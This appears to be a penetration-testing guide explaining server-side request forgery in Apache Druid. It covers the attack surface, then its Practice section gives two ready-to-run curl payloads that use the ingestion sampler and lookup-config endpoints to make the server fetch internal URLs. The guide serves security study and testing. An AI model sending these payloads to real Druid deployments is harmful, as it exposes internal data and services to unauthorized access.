---
title: Exploiting SSRF in Apache Druid
description: Learn about exploiting SSRF vulnerabilities in Apache Druid's HTTP services
  for unauthorized access.
keywords:
- Apache Druid
- SSRF vulnerability
- HTTP endpoints
- web console
- unauthorized access
- Druid ingestion
- lookup attacks
- real-time analytics
- web security
- cybersecurity threats
---

# Apache Druid

## Context

The objective of this guide is to demonstrate the operational exploitation of Server-Side Request Forgery (SSRF) vulnerabilities found within Apache Druid. Apache Druid, a real-time analytics database, often exposes HTTP-based service interactions, which can be exploited when misconfigurations occur. This content assumes knowledge of core HTTP protocol characteristics, web server architecture, and general SSRF exploitation techniques.

## Theory

### Apache Druid Architecture and Attack Surface

Apache Druid is a distributed data store designed for high-performance real-time analytics. It operates with a RESTful API and a web console, which are significant interactive features of Druid. Each Druid node exposes a variety of HTTP endpoints, enabling functionalities such as data ingestion, querying, and cluster management.

When Druid deployments are misconfigured, they may inadvertently expose internal HTTP endpoints to unauthenticated users, providing a potential attack surface for adversaries targeting SSRF.

### Druid Console and Unauthorized Endpoints

The Druid Console is an essential web interface used for cluster administration, facilitating tasks like data ingestion and query execution. Attackers can exploit this console or leverage the REST API to initiate SSRF by connecting to unauthorized ingestion or lookup endpoints.

Druid often assumes that requests made to these endpoints are initiated by trusted sources. This assumption sets the stage for an SSRF attack when an attacker successfully imitates a trusted source.

### Security Misconfigurations in Druid

Default installations of Apache Druid may lack essential security controls such as authentication and proper network segmentation, thereby exposing sensitive endpoints. Furthermore, Druid's ingestion and lookup functionalities may inadvertently retrieve remote resources using URLs provided by users, especially in the absence of stringent URL validation mechanisms.

### Exploiting Druid Endpoints for SSRF

By crafting HTTP requests to Druid's ingestion or lookup endpoints with URLs controlled by the attacker, one can exploit SSRF. An effective strategy for bypassing simple URL filtering mechanisms involves the encoding of URLs or employing alternative schemes permitted by the target setup.

## Practice

### SSRF via Druid Ingestion Endpoint

The following series of steps outlines how to conduct an SSRF attack using the Druid ingestion endpoint.

- **Execute the following command:**

    ```bash
    curl -X POST 'http://<druid-host>:8888/druid/indexer/v1/sampler' -H 'Content-Type: application/json' -d '{"type":"index","spec":{"ioConfig":{"type":"index","inputSource":{"type":"http","uris":["http://localhost:8000/secret"]},"inputFormat":{"type":"json"}}}}'
    ```

    This crafted ingestion specification references an internal HTTP resource at "http://localhost:8000/secret".

- **Observe the response:**

    A successful SSRF will result in a response that includes the content retrieved from the internal resource, confirming that it has accessed a restricted URL.

### SSRF via Druid Lookup Endpoint

Another vector involves the Druid lookup endpoint, as detailed below:

- **Execute the following command:**

    ```bash
    curl -X POST 'http://<druid-host>:8888/druid/coordinator/v1/lookups/config' -H 'Content-Type: application/json' -d '{"lookupExtractorFactoryMap":{"malicious":{"type":"cachedNamespace","extractionNamespace":{"type":"uri","uri":"http://localhost:8000/secret","namespaceParseSpec":{"format":"flat"}}}}}'
    ```

    Here, a lookup is registered using an internal HTTP resource URI, thereby attempting to extract internal data.

- **Verify the output:**

    The response should display any internal data fetched or indicate that the lookup registration has triggered an outbound request, thus confirming SSRF exploitation.

## Tools
- **curl**
- **Burp Suite**